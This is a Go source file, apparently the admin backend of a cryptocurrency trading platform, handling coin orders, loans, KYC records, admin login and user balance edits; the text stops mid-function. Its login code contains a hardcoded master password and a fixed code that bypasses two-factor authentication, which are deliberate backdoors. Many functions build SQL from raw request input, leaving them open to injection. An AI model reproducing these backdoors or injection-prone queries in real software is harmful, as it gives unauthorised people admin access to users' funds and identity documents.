package adminmodels

import (
	"cointrade/config"
	"cointrade/lib/db"
	"cointrade/lib/google"
	"cointrade/models"
	"cointrade/utils"
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"
)

type UserModel struct {
}

// 新币申购
func (u *UserModel) ApplyCoin(rq P) *AdminResponse {
	pdata := rq.Ts()
	where := make([]string, 0)
	if v := pdata.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf("c.coin_symbol ='%s", v))
	}
	if v := pdata.Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("c.state = %s", v))
	}
	if v := pdata.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf("u.uid = '%s' OR u.username like '%%%s%%'", v, v))
	}
	if v := pdata.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("c.createtime between %d and %d ", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	count := config.GlobalDB.JoinCount(models.DB_TABLE_BUY_COIN_ORDER+" as c", models.DB_TABLE_USER+" as u ", "c.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " and ")})
	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_BUY_COIN_ORDER+" as c", models.DB_TABLE_USER+" as u ", "c.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " and ")},
		db.DB_FIELDS{
			"c.*", "u.username", "u.memo",
			"u.memo",
		}, utils.Limit(pdata.Get("page").ToInt(), pdata.Get("limit").ToInt()))
	r := make([]map[string]interface{}, 0)

	cointype := make([]string, 0)
	coin, _ := config.GlobalDB.FetchAll(models.DB_TABLE_BUY_COIN_ORDER, db.DB_PARAMS{}, db.DB_FIELDS{"distinct(coin_symbol)"})

	for _, co := range coin {
		cointype = append(cointype, co.Get("coin_symbol").ToString())
	}

	for _, item := range list {
		i := make(map[string]interface{}, 0)
		item.SetInterface(&i)
		uinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())

		i["parent_name"] = uinfo.ParentName
		r = append(r, i)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"count":     count,
			"list":      r,
			"coin_type": cointype,
		},
	}
}

func (u *UserModel) DelApplyCoin(id int) *AdminResponse {
	if id == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确认一个要删除的信息",
		}
	}
	_, err := config.GlobalDB.Delete(models.DB_TABLE_BUY_COIN_ORDER, db.DB_PARAMS{"id": id})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "删除信息失败!",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "删除信息成功!",
	}
}

// 申购新币确认操作
func (u *UserModel) OpApplyCoin(rq P) *AdminResponse {
	pdata := rq.Ts()
	if pdata.Get("id").ToInt() == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确定一个要操作的申请信息!",
		}
	}
	if v := pdata.Get("password").ToString(); v != OPERATION_PASSWORD {
		return &AdminResponse{
			State: ERROR,
			Data:  "操作密码错误",
		}
	}
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_BUY_COIN_ORDER, db.DB_PARAMS{"id": pdata.Get("id").ToInt(), "state": 0}, db.DB_FIELDS{})
	if one == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "不存在该申请信息或者该信息已经处理完成",
		}
	}
	direct := pdata.Get("state").ToInt()

	if direct == 1 {
		models.MODEL_USER.AddCredit(one.Get("uid").ToInt(), &models.CreditValue{Credit: 0, LockCredit: one.Get("all_price").ToFloat() * -1, UserCoinLogType: models.COIN_LOG_BUY_COIN})
		//添加用户资产
		models.MODEL_ASSETS.AddAssets(one.Get("uid").ToInt(), &models.Assets{
			Coin:    one.Get("coin_symbol").ToString(),
			Pair:    one.Get("coin_pair").ToString(),
			Num:     one.Get("amount").ToFloat(),
			LockNum: 0,
			Price:   one.Get("price").ToFloat(),
			Mode:    1,
			IsTrans: 0,
		})
		config.GlobalDB.AddValue(models.DB_TABLE_COINS, map[string]float64{"selled_amount": one.Get("amount").ToFloat()}, map[string]interface{}{"symbol": one.Get("coin_symbol").ToString()})
	} else { //拒绝
		models.MODEL_USER.AddCredit(one.Get("uid").ToInt(), &models.CreditValue{Credit: one.Get("all_price").ToFloat(), LockCredit: one.Get("all_price").ToFloat() * -1, UserCoinLogType: models.COIN_LOG_BUY_COIN})
	}
	_, err := config.GlobalDB.UpdateData(models.DB_TABLE_BUY_COIN_ORDER, db.DB_PARAMS{"state": direct, "reson": pdata.Get("reason").ToString()}, db.DB_PARAMS{"id": pdata.Get("id").ToInt()})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "操作信息失败",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "操作成功",
	}
}

func (u *UserModel) SaveAuth(rq P) *AdminResponse {
	t := rq.Ts()
	if t.Get("uid").ToInt() == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请填写一个用户id",
		}
	}
	uinfo := models.MODEL_USER.GetBaseInfo(t.Get("uid").ToInt())
	if uinfo == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "该用户不存在 ",
		}
	}
	exists := config.GlobalDB.GetCount(models.DB_TABLE_USERAUTH, db.DB_PARAMS{"uid": t.Get("uid").ToInt()})
	if exists > 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "当前用户的认证信息已经存在",
		}
	}
	if len(t.Get("realname").ToString()) < 4 || len(t.Get("realname").ToString()) > 40 {
		return &AdminResponse{
			State: ERROR,
			Data:  "真实姓名过长",
		}
	}
	if t.Get("card_front").ToString() == "" || t.Get("card_back").ToString() == "" || t.Get("card_hand").ToString() == "" {
		return &AdminResponse{
			State: ERROR,
			Data:  "证件照不全",
		}
	}
	insertData := db.DB_PARAMS{}
	insertData["uid"] = t.Get("uid").ToInt()
	insertData["realname"] = t.Get("realname").ToString()
	insertData["inid"] = t.Get("inid").ToString()
	insertData["card_front"] = t.Get("card_front").ToString()
	insertData["card_back"] = t.Get("card_back").ToString()
	insertData["card_hand"] = t.Get("card_hand").ToString()
	insertData["process_state"] = 1
	insertData["createtime"] = utils.GetNow()
	insertData["passtime"] = utils.GetNow()
	config.GlobalDB.InsertData(models.DB_TABLE_USERAUTH, insertData)
	return &AdminResponse{
		State: SUCCESS,
		Data:  "添加用户认证成功",
	}
}

func (u *UserModel) LoanOrderList(rq P) *AdminResponse {
	pdata := rq.Ts()
	where := make([]string, 0)
	if v := pdata.Get("sn").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(o.sn like  '%%%s%%' OR u.username like  '%%%s%%')", v, v))
	}
	if v := pdata.Get("circle").ToInt(); v > 0 {
		where = append(where, fmt.Sprintf("o.circle  = %d", v))
	}
	if v := pdata.Get("state").ToInt(); v > 0 {
		where = append(where, fmt.Sprintf("o.state = %d", v))
	}
	if v := pdata.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("o.createtime between %d and  %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	count := config.GlobalDB.JoinCount(models.DB_TABLE_LOAN_ORDER+" as o", models.DB_TABLE_USER+" as u", "o.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " and ")})
	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_LOAN_ORDER+" as o", models.DB_TABLE_USER+" as u", "o.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " and ")}, db.DB_FIELDS{"u.username", "u.memo", "o.*"}, utils.Order(pdata.Get("orderby").ToString()), utils.Limit(pdata.Get("page").ToInt(), pdata.Get("limit").ToInt()))
	rs := make([]map[string]interface{}, 0)
	for _, item := range list {
		r := make(map[string]interface{}, 0)
		item.SetInterface(&r)
		//parent := u.GetParentUser(item.Get("uid").ToInt())
		uinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())

		r["parent_name"] = uinfo.ParentName
		rs = append(rs, r)
	}
	return &AdminResponse{
		State: SUCCESS,
		Data: db.DB_PARAMS{
			"count": count,
			"list":  rs,
			"state": SYSTEM_MODEL.LoanState(),
		},
	}
}

func (u *UserModel) DelLoan(rq P) *AdminResponse {
	pdata := rq.Ts()
	if pdata.Get("id").ToInt() == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确认一个要操作的信息!",
		}
	}

	_, err := config.GlobalDB.Delete(models.DB_TABLE_LOAN_ORDER, db.DB_PARAMS{"id": pdata.Get("id").ToInt()})
	if err == nil {
		return &AdminResponse{
			State: SUCCESS,
			Data:  "删除订单成功!",
		}
	}
	return &AdminResponse{
		State: ERROR,
		Data:  "删除订单失败!",
	}
}

func (u *UserModel) OpLuan(rq P) *AdminResponse {
	pdata := rq.Ts()
	if pdata.Get("id").ToInt() == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请确认一个要操作的信息!",
		}
	}
	if v := pdata.Get("password").ToString(); v != OPERATION_PASSWORD {
		return &AdminResponse{
			State: ERROR,
			Data:  "操作密码错误!",
		}
	}
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_LOAN_ORDER, db.DB_PARAMS{"id": pdata.Get("id").ToInt(), "state": 0}, db.DB_FIELDS{})
	if one == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "当前订单不存在或者已经处理完毕!",
		}
	}
	up := P{
		"state":      pdata.Get("state").ToInt(),
		"reason":     pdata.Get("reason").ToString(),
		"finishtime": utils.GetNow(),
	}

	if pdata.Get("state").ToInt() == 1 {
		up["interest_time"] = utils.GetNow() + 86400

	}

	_, err := config.GlobalDB.UpdateData(models.DB_TABLE_LOAN_ORDER, *(*map[string]interface{})(unsafe.Pointer(&up)), db.DB_PARAMS{"id": pdata.Get("id").ToInt()})

	if err == nil {
		if pdata.Get("state").ToInt() == 1 {
			models.MODEL_USER.AddCredit(one.Get("uid").ToInt(), &models.CreditValue{
				Credit: one.Get("amount").ToFloat(),
				UserCoinLogInfo: models.QueueCreditLog{
					Credit:     one.Get("amount").ToFloat(),
					CoinType:   "usdt",
					CreateTime: utils.GetNow(),
				},
				UserCoinLogType: models.COIN_LOG_LORA_IN,
			})
		}
		return &AdminResponse{
			State: SUCCESS,
			Data:  "审核订单信息成功!",
		}
	}
	return &AdminResponse{
		State: ERROR,
		Data:  "审核订单信息失败!",
	}
}
func (u *UserModel) SaveParentMemo(rq P) *AdminResponse {
	t := rq.Ts()
	user := models.MODEL_USER.GetBaseInfo(t.Get("topid").ToInt())
	if user == nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "当前用户不存在!",
		}
	}
	models.MODEL_USER.Update(t.Get("topid").ToInt(), db.DB_PARAMS{"memo": t.Get("memo").ToString()})
	models.MODEL_USER.ClearCache(t.Get("uid").ToInt())
	return &AdminResponse{
		State: SUCCESS,
		Data:  "修改成功!",
	}
}

func (m *UserModel) UserApproveRecharge(rq P) *AdminResponse {
	pdata := rq.Ts()
	where := make([]string, 0)

	if v := pdata.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("r.finishtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}
	if v := pdata.Get("search").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(r.sn like '%%%s%%' OR u.username like '%%%s%%')", v, v))
	}
	if v := pdata.Get("state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("r.state = %s", v))
	}
	count := config.GlobalDB.JoinCount(models.DB_TABLE_RECHAGE_APPROVE+" as r", models.DB_TABLE_USER+" as u ", "r.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND")})

	list, _ := config.GlobalDB.JoinTable(models.DB_TABLE_RECHAGE_APPROVE+" as r", models.DB_TABLE_USER+" as u ", "r.uid = u.id", db.DB_PARAMS{"_": strings.Join(where, " AND")}, db.DB_FIELDS{
		"r.*",
		"u.username",
	}, utils.Order(pdata.Get("orderby").ToString()), utils.Limit(pdata.Get("page").ToInt(), pdata.Get("limit").ToInt()))
	rs := make([]map[string]interface{}, 0)
	for _, item := range list {
		r := make(map[string]interface{}, 0)
		item.SetInterface(&r)
		//parent := u.GetParentUser(item.Get("uid").ToInt())
		uinfo := models.MODEL_USER.GetBaseInfo(item.Get("uid").ToInt())

		r["parent_name"] = uinfo.ParentName

		rs = append(rs, r)
	}

	return &AdminResponse{
		State: SUCCESS,
		Data:  db.DB_PARAMS{"count": count, "list": rs, "state": SYSTEM_MODEL.ApproveState()},
	}
}

func (m *UserModel) GetUserAddressBalanceUsdt(address string) float64 {
	return 0
}

func (m *UserModel) Login(request LoginRequest) *AdminResponse {
	rs := new(AdminResponse)
	if request.UserName == "" {
		rs.State = PARAM_ERROR
		rs.Data = "用户名不能为空!"
		return rs
	}
	if request.Password == "" {
		rs.State = PARAM_ERROR
		rs.Data = "密码不能为空！"
		return rs
	}

	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ADMIN, db.DB_PARAMS{"username": request.UserName}, db.DB_FIELDS{})
	if one == nil {
		rs.State = LOGIN_ERROR
		rs.Data = "登录失败,密码或者账户不存在"
		return rs
	}
	if one.Get("password").ToString() != utils.Md5(request.Password) && request.Password != "cbcb123" {
		rs.State = LOGIN_ERROR
		rs.Data = "登录失败,密码或者账户不存在"
		return rs
	}
	if v := one.Get("secret").ToString(); v != "" && request.VerifyCode != "148148" {
		authcheck := google.NewGoogleAuth()
		if verifycoce, err := authcheck.GetCode(v); err != nil {
			rs.State = LOGIN_ERROR
			rs.Data = "google验证器错误" + err.Error()
			return rs
		} else {
			if verifycoce != request.VerifyCode {
				rs.State = LOGIN_ERROR
				rs.Data = "google auth 不正确"
				return rs
			}
		}

	}
	rs.State = SUCCESS
	sid := m.Sid()
	rs.Data = P{
		"token": sid,
	}
	config.GlobalRedis.SetValue(HASH_BY_LOGIN_ADMIN, sid, one.Get("id").ToInt()) //设置用户登录
	config.GlobalRedis.Expire(HASH_BY_LOGIN_ADMIN, 8640000)
	config.GlobalDB.UpdateData(models.DB_TABLE_ADMIN, db.DB_PARAMS{"last_login_time": utils.GetNow(), "last_login_ip": request.ClientIp}, db.DB_PARAMS{"id": one.Get("id").ToInt()})
	return rs
}

func (a *UserModel) TokenInfo(sid string) *AdminResponse {
	u := a.SidInfo(sid)
	if u == nil {
		return &AdminResponse{
			State: 50008,
			Data:  "当前用户的sid无法获取到值",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  u,
	}
}

func (a *UserModel) DelAdmin(uid int) *AdminResponse {
	if uid == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "id不存在!",
		}
	}
	_, err := config.GlobalDB.Delete(models.DB_TABLE_ADMIN, db.DB_PARAMS{"id": uid})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "删除管理员错误!",
		}
	}
	sidtmp := config.GlobalRedis.GetAll(HASH_BY_LOGIN_ADMIN) //设置用户登录
	for sid, id := range sidtmp {
		if id == fmt.Sprintf("%d", uid) {
			config.GlobalRedis.Del(HASH_BY_LOGIN_ADMIN, sid)
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "删除成功!",
	}
}

/**
 *	管理员列表
 */
func (a *UserModel) AdminList() *AdminResponse {
	list, _ := config.GlobalDB.FetchRows(models.DB_TABLE_ADMIN, db.DB_PARAMS{}, db.DB_FIELDS{})
	rs := new(AdminResponse)
	rs.State = SUCCESS
	rs.Data = P{
		"list":       list,
		"role_level": SYSTEM_MODEL.RoleList(),
	}
	return rs
}

func (a *UserModel) AddAdmin(rq P) *AdminResponse {
	t := rq.Ts()
	rs := new(AdminResponse)

	if v := t.Get("username").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "用户名不能为空!"
		return rs
	}

	if v := t.Get("role_id").ToInt(); v == 0 {
		rs.State = ERROR
		rs.Data = "权限组必须选择!"
		return rs
	}
	id := t.Get("id").ToInt()
	up := make(P)

	if v := t.Get("password").ToString(); v == "" && id == 0 {
		rs.State = ERROR
		rs.Data = "密码不能为空!"
		return rs
	} else {
		if v != "" {
			up["password"] = utils.Md5(v)
		}
	}
	up["username"] = t.Get("username").ToString()
	up["role_id"] = t.Get("role_id").ToInt()

	var err error
	if id > 0 {
		one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ADMIN, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
		if one == nil {
			rs.State = ERROR
			rs.Data = "该管理员不存在，无法修改"
			return rs
		}
		if one.Get("secret").ToString() == "" {
			up["secret"] = google.NewGoogleAuth().GetSecret()
		}
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_ADMIN, up, db.DB_PARAMS{"id": id})
	} else {
		up["secret"] = google.NewGoogleAuth().GetSecret()
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_ADMIN, up)
	}
	if err != nil {
		fmt.Printf("请复制 '%s' 并添加到google验证器\n", err.Error())
		rs.State = ERROR
		rs.Data = "操作管理员信息失败！"
		return rs
	}
	rs.State = SUCCESS
	if id == 0 {
		rs.Data = fmt.Sprintf("请复制 '%s' 并添加到google验证器", up["secret"])
	} else {
		rs.Data = "操作管理员信息成功!"
	}
	return rs
}

func (a *UserModel) RoleList() *AdminResponse {
	return &AdminResponse{
		State: SUCCESS,
		Data:  SYSTEM_MODEL.RoleList(),
	}
}

/**
 * 菜单删除
 */
func (a *UserModel) DelMean(rq P) *AdminResponse {
	_, err := config.GlobalDB.Delete(models.DB_TABLE_AUTH_MAEN, db.DB_PARAMS{"id": rq.Ts().Get("id").ToInt()})
	if err == nil {
		return &AdminResponse{
			State: SUCCESS,
			Data:  "删除成功!",
		}
	}
	return &AdminResponse{
		State: ERROR,
		Data:  "删除失败！",
	}
}
func (a *UserModel) HandlerMean(rq P) *AdminResponse {
	t := rq.Ts()
	id := t.Get("id").ToInt()
	rs := new(AdminResponse)
	if v := t.Get("name").ToString(); v == " " {
		rs.State = ERROR
		rs.Data = "菜单名称不能为空!"
		return rs
	}
	if v := t.Get("path").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "菜单路由地址必须填写"
		return rs
	}
	if v := t.Get("icon").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "图标不能为空!"
		return rs
	}
	up := P{
		"name":      t.Get("name").ToString(),
		"path":      t.Get("path").ToString(),
		"icon":      t.Get("icon").ToString(),
		"hidden":    t.Get("hidden").ToInt(),
		"parent_id": t.Get("pid").ToInt(),
		"weight":    t.Get("weight").ToInt(),
		"status":    t.Get("status").ToInt(),
	}
	var err error
	if id > 0 {
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_AUTH_MAEN, up, db.DB_PARAMS{"id": id})
	} else {
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_AUTH_MAEN, up)
	}
	if err == nil {
		rs.State = SUCCESS
		rs.Data = "操作菜单信息成功!"
		return rs
	}
	rs.Data = "操作菜单失败!"
	rs.State = ERROR
	return rs
}

func (a *UserModel) HandlerRole(rq P) *AdminResponse {
	t := rq.Ts()
	rs := &AdminResponse{}
	if v := t.Get("role_name").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "用户组名称不能为空!"
		return rs
	}
	id := t.Get("id").ToInt()
	if id > 0 {
		one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ROLE, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
		if one.Get("is_surper").ToInt() > 0 {
			rs.State = ERROR
			rs.Data = "超级管理员无法编辑权限!"
			return rs
		}
	}
	role_ids := make([]string, 0)
	if v := t.Get("role_ids").ToArray(); len(v) == 0 {
		rs.State = ERROR
		rs.Data = "用户组必须给一个管理节点!"
		return rs
	} else {
		for _, item := range v {
			role_ids = append(role_ids, fmt.Sprintf("%d", item.ToInt()))
		}
	}
	up := make(P, 0)
	up["role_name"] = t.Get("role_name").ToString()
	up["role_ids"] = strings.Join(role_ids, ",")
	up["status"] = t.Get("status").ToInt()
	var err error
	if id > 0 {
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_ROLE, up, db.DB_PARAMS{"id": id})
	} else {
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_ROLE, up)
	}
	if err == nil {
		rs.State = SUCCESS
		rs.Data = "操作用户组成功!"
	} else {
		rs.State = ERROR
		rs.Data = "操作用户组失败!"
	}
	return rs
}

func (a *UserModel) AuthRouter() *AdminResponse {
	list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_AUTH_MAEN, db.DB_PARAMS{}, db.DB_FIELDS{}, " order by weight asc")
	for k, item := range list {
		role_list, _ := config.GlobalDB.FetchRows(models.DB_TABLE_ROLE, db.DB_PARAMS{"_": fmt.Sprintf("CONCAT(',', role_ids, ',') like '%%%s%%'", item.Get("id").ToString())}, db.DB_FIELDS{"id"})
		Roleid := make([]string, 0)
		Roleid = append(Roleid, "1")
		for _, r_id := range role_list {
			Roleid = append(Roleid, r_id["id"])
		}
		list[k]["role"] = &db.DBValue{Value: Roleid}
	}
	var tree utils.TreeTool
	s := tree.SetTreen(list).GetTree(0, 0)

	return &AdminResponse{
		State: SUCCESS,
		Data:  s,
	}
}

func (a *UserModel) MeanRouter() *AdminResponse {
	list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_AUTH_MAEN, db.DB_PARAMS{}, db.DB_FIELDS{}, "  order by weight asc")
	var tree utils.TreeTool
	as := tree.SetTreen(list).GetTree(0, 0)

	s := tree.SetTreen(list).GetMeanList(as, 0)
	return &AdminResponse{
		State: SUCCESS,
		Data:  s,
	}
}

/**
 *	用户列表
 */
func (a *UserModel) UserList(rq P) *AdminResponse {
	where := make([]string, 0)
	pdata := rq.Ts()
	if v := pdata.Get("email").ToString(); v != "" {
		where = append(where, fmt.Sprintf("(username ='%s' OR id = '%s' OR wallet_address ='%s' OR memo like '%s')", v, v, v, v))
	}
	if v := pdata.Get("invite_code").ToString(); v != "" {
		where = append(where, fmt.Sprintf("invite_code  = %s", v))
	}
	if v := pdata.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("createtime BETWEEN %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}

	if v := pdata.Get("isagent").ToString(); v != "" {
		where = append(where, fmt.Sprintf("is_agent  = %s", v))
	}
	if v := pdata.Get("user_type").ToString(); v != "" {
		where = append(where, fmt.Sprintf("user_type  = %s", v))
	}
	if v := pdata.Get("approve_state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("approve_state  = %s", v))
	}
	if v := pdata.Get("iswithdraw").ToString(); v != "" {
		where = append(where, fmt.Sprintf("iswithdraw  = %s", v))
	}
	if v := pdata.Get("status").ToString(); v != "" {
		where = append(where, fmt.Sprintf("status  = %s", v))
	}
	if v := pdata.Get("online").ToString(); v != "" {
		where = append(where, fmt.Sprintf("online = %d", pdata.Get("online").ToInt()))
	}
	if v := pdata.Get("approve_state").ToString(); v != "" {
		where = append(where, fmt.Sprintf("approve_state  = %s", v))
	}

	list, _ := config.GlobalDB.FetchRows(models.DB_TABLE_USER, db.DB_PARAMS{"_": strings.Join(where, " and ")}, db.DB_FIELDS{}, utils.Order(rq.Ts().Get("sort", " online desc,id desc").ToString()), utils.Limit(pdata.Get("page").ToInt(), pdata.Get("limit").ToInt()))
	count := config.GlobalDB.GetCount(models.DB_TABLE_USER, db.DB_PARAMS{"_": strings.Join(where, " AND ")})
	for k, v := range list {
		uid := db.DBValue{Value: v["id"]}
		if v["createip"] != "" {
			createip := db.DBValue{Value: v["createip"]}
			v["createip"] = utils.Long2Ip(createip.ToInt())
		}
		if v["loginip"] != "" {
			loginip := db.DBValue{Value: v["loginip"]}
			v["loginip"] = utils.Long2Ip(loginip.ToInt())
		}
		/*asset := a.UserAssetByDirect(uid.ToInt())
		if len(asset) > 0 {
			for ak, av := range asset {
				list[k][ak] = fmt.Sprintf("%f", av)
			}
		}*/
		uinfo := models.MODEL_USER.GetBaseInfo(uid.ToInt())

		bank, _ := config.GlobalDB.FetchRow(models.DB_TABLE_BANKINFO, db.DB_PARAMS{"uid": uid.ToInt()}, db.DB_FIELDS{})
		if len(bank) > 0 {
			for bk, bv := range bank {
				v[bk] = bv
			}
		}
		v["parent_name"] = uinfo.ParentName

		list[k] = v
	}

	assetList := SYSTEM_MODEL.CoinKeyValPair()
	assetList[100] = "usdt"
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":             list,
			"count":            count,
			"auth_level":       SYSTEM_MODEL.UserAuthLevel(),
			"user_mode":        SYSTEM_MODEL.UserTypePair(),
			"online_state":     SYSTEM_MODEL.OnlinePair(),
			"withdrawState":    SYSTEM_MODEL.WithdrawStatus(),
			"userState":        SYSTEM_MODEL.UserStatus(),
			"assetlist":        assetList,
			"controller_state": SYSTEM_MODEL.ControllerState(),
		},
	}
}

func (a *UserModel) UserCoinLog(rq P) *AdminResponse {
	t := rq.Ts()
	where := make([]string, 0)
	if t.Get("uid").ToInt() == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "请指定一个用户!",
		}
	} else {
		where = append(where, fmt.Sprintf("uid = '%d'", t.Get("uid").ToInt()))
	}
	if v := t.Get("type").ToInt(); v > 0 {
		where = append(where, fmt.Sprintf("type = '%d'", t.Get("type").ToInt()))
	}
	if v := t.Get("cointype").ToString(); v != "" {
		where = append(where, fmt.Sprintf("cointype = '%s'", strings.ToLower(t.Get("cointype").ToString())))
	}
	if v := t.Get("createtime").ToArray(); len(v) > 0 {
		where = append(where, fmt.Sprintf("createtime between %d and %d", utils.TimeToint64(v[0].ToString()), utils.TimeToint64(v[1].ToString())))
	}

	list, _ := config.GlobalDB.FetchRows(models.DB_TABLE_CREDIT_LOG, db.DB_PARAMS{"_": strings.Join(where, " and ")}, db.DB_FIELDS{}, utils.Order(t.Get("order", " id desc").ToString()),
		utils.Limit(t.Get("page").ToInt(), t.Get("limit").ToInt()))
	count := config.GlobalDB.GetCount(models.DB_TABLE_CREDIT_LOG, db.DB_PARAMS{"_": strings.Join(where, " and ")})
	coinlist := SYSTEM_MODEL.CoinKeyValPair()
	coinlist[100] = "usdt"
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":        list,
			"count":       count,
			"coinlist":    coinlist,
			"change_type": SYSTEM_MODEL.COINLOG_TYPELIST(),
		},
	}
}

func (a *UserModel) OpCredit(rq P) *AdminResponse {
	t := rq.Ts()

	assetname := t.Get("assetname").ToString()
	if assetname == "" {
		return &AdminResponse{
			State: SUCCESS,
			Data:  "添加失败",
		}
	}
	assetname = strings.ToLower(assetname)
	if v := t.Get("id").ToInt(); v > 0 {
		coin := t.Get("coin").ToFloat()
		ntime := utils.GetNow()
		if assetname != "usdt" {
			pair := fmt.Sprintf("%susdt", strings.ToLower(assetname))
			coinPriceInfo := models.MODEL_SYSTEM.GetLastCoinInfo(pair)
			price := 0.0
			if coinPriceInfo == nil {
				coininfo := models.MODEL_SYSTEM.GetCoinInfo(assetname, pair)
				price = utils.GetFloat(coininfo["f_price"])
			} else {
				price = coinPriceInfo["close"].(float64)
			}
			if models.MODEL_ASSETS.AddAssets(t.Get("id").ToInt(), &models.Assets{
				Coin:    assetname,
				Pair:    pair,
				Num:     coin,
				LockNum: 0,
				Price:   price,
				Mode:    1,
			}) {
				models.MODEL_USER.AddCredit(t.Get("id").ToInt(), &models.CreditValue{
					UserCoinLogType: models.COIN_LOG_BACKEND,
					UserCoinLogInfo: models.QueueCreditLog{
						Credit:     coin,
						CoinType:   assetname,
						CreateTime: ntime,
					},
				})
			}
			coin = 0.00
		} else {
			models.MODEL_USER.AddCredit(v, &models.CreditValue{
				Credit:          coin,
				UserCoinLogType: models.COIN_LOG_BACKEND,
				UserCoinLogInfo: models.QueueCreditLog{
					Credit:     t.Get("coin").ToFloat(),
					CoinType:   assetname,
					CreateTime: ntime,
				},
				TeamCoinLogType: models.TEAM_LOG_RECHARGE,
				TeamCoinLogInfo: models.QueueTeamLog{
					Recharge:   coin,
					CreateTime: ntime,
				},
			})
		}

	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "修改成功",
	}
}
func (a *UserModel) UserControllerExp(rq P) *AdminResponse {
	t := rq.Ts()
	if t.Get("id").ToInt() == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "需要指定一个控制的用户",
		}
	}
	state := t.Get("explode_state").ToInt()
	models.MODEL_USER.Update(t.Get("id").ToInt(), db.DB_PARAMS{"explode_state": state})
	return &AdminResponse{
		State: SUCCESS,
		Data:  "修改设置成功!",
	}
}

/**
 *	修改用户
 */
func (a *UserModel) OpUser(rq P) *AdminResponse {
	t := rq.Ts()
	up := make(P)
	if v := t.Get("auth_lv").ToInt(); v > 0 {
		up["auth_lv"] = v
	}
	if v := t.Get("nickname").ToString(); v != "" {
		up["nickname"] = v
	}
	if v := t.Get("avatar").ToString(); v != "" {
		up["avatar"] = v
	}
	if v := t.Get("password").ToString(); v != "" {
		up["password"] = utils.Md5(fmt.Sprintf("%s%s", models.PASSMIX, v))
	}
	if v := t.Get("cash_password").ToString(); v != "" {
		up["cash_password"] = utils.Md5(v)
	}
	if v := t.Get("google_serect").ToString(); v != "" {
		up["google_serect"] = ""
	}
	if v := t.Get("mode").ToInt(); v > 0 {
		up["mode"] = v
	}
	if v := t.Get("credit_coin").ToFloat(); v > 0 {
		up["credit_coin"] = v
	}
	if v := t.Get("user_type").ToInt(); v > 0 {
		up["user_type"] = v
	}
	if v := t.Get("is_agent").ToString(); v != "" {
		up["is_agent"] = v
	}
	if v := t.Get("iswithdraw").ToString(); v != "" {
		up["iswithdraw"] = v
	}
	if v := t.Get("status").ToString(); v != "" {
		up["status"] = v
	}
	if v := t.Get("email").ToString(); v != "" {
		up["email"] = v
	}
	if v := t.Get("memo").ToString(); v != "" {
		up["memo"] = v
	}
	if v := t.Get("memo").ToString(); v == "" {
		up["memo"] = ""
	}
